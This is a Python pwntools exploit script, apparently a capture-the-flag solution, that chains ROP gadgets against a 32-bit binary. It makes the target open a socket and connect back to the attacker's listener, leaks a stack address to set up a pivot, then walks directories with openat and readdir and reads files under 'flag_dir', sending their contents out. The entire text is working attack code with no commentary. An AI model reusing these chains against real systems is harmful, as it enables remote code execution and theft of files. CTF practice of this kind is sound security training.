from pwn import *
from stage1 import *

# First listen the server and send the payload to avoid connection refused error
_r = r
r = server(512)
_r.send(a)

context.log_level = 'error'

# Same gadgets
edx = 0x0805c422

stage3 = flat([
    0x61616161
])

a = flat({
    0x10: [
        0x10,
        # socket(2, 1, 0)
        0x0806f112, sc, 1, eax, 102, sys,
        # connect(0, addr, 0x10)
        0x0806f112, buf + 4, 3, eax, 102, sys,
        # ecx = [environ]
        0x080562f4, 4, 0x080DBBC0-0x24, 0,
        0x0809026e,
        0x08050616,
        # write(0, ecx, 4)
        sys,
        # ROP again!
        main,
    ]
})
c = r.next_connection()

c.send(a)

c = r.next_connection()
pivot = u32(c.read(4))
pivot &= ~0xfff
pivot -= 0x2000
print(hex(pivot))

esp = 0x080a8d76


def pivot_payload(size): return [
    0x0806CF30, 0x8049b19, 0, pivot, size,
    esp,
    pivot,
]


sysarg2 = 0x0806f112
a = flat({
    0x10: [
        0x10,

        # socket, connect
        sysarg2, sc, 1, eax, 102, sys,
        sysarg2, buf + 4, 3, eax, 102, sys,
        pivot_payload(0x100)
    ]
})

c.send(a.ljust(100))

c = r.next_connection()
pppr = 0x080562f4
pivot -= 0x100


def traverse(path):
    global pivot
    c.send(flat(
        [
            [
                # openat(path, 0)
                0x0807dfd8,
                path.ljust(0x3c, b'\x00'),
                sysarg2,
                0,
                pivot + 0x104,
                eax,
                constants.SYS_open,
                edx,
                0,
                sys
            ],
            pivot_payload(0x80)
        ])
    )
    time.sleep(0.1)
    names = []
    for i in range(100):
        pivot -= 0x100
        a = flat([
            edx,
            0x1000,
            sysarg2,
            pivot - 0x1000,
            1,
            eax,
            constants.SYS_readdir,
            # readdir(1, buf, 0x10000)
            sys,
            # write(0, buf, 0x100)
            [
                edx, 0x100,
                sysarg2, pivot - 0x1000, 0, eax, constants.SYS_write, sys
            ],
            pivot_payload(0x80)
        ])
        c.send(a)
        name = c.recv(1024)[10:].split(b'\x00')[0]
        if name in (b'.', b'..'):
            continue
        if not name:
            break
        print(path + b'/' + name)
        names.append(name)

    pivot -= 0x100
    c.send(flat([
        # close(1)
        sysarg2,
        0, 1,
        eax,
        constants.SYS_close,
        sys,
        pivot_payload(0x100)
    ]))
    pivot -= 0x100
    return names


def read(path):
    global pivot
    c.send(flat([
        [
            # openat(buf, 0)
                0x08093b6e,
                path.ljust(0x4c, b'\x00'),
                sysarg2,
                0,
                pivot + 0x104,
                eax,
                constants.SYS_open,
                edx,
                0,
                sys
                ],
        [
            # read + write
            sysarg2, pivot - 0x1000, 1,
            edx, 0x100,
            eax,
            constants.SYS_read, sys,
            sysarg2, pivot - 0x1000, 0,
            eax,
            constants.SYS_write, sys,
        ],
        [
            # close
            sysarg2, 0, 1,
            eax, constants.SYS_close,
            sys,
        ],
        pivot_payload(0x100)
    ]))
    print(path)
    flag = (c.recvn(0x100).strip(b'\x00'))
    print(flag)
    pivot -= 0x100


names = traverse(b'flag_dir')
for x in names:
    for y in traverse(b'flag_dir/' + x):
        p = b'flag_dir/' + x + b'/' + y
        for z in traverse(p):
            read(p + b'/' + z)

pause()
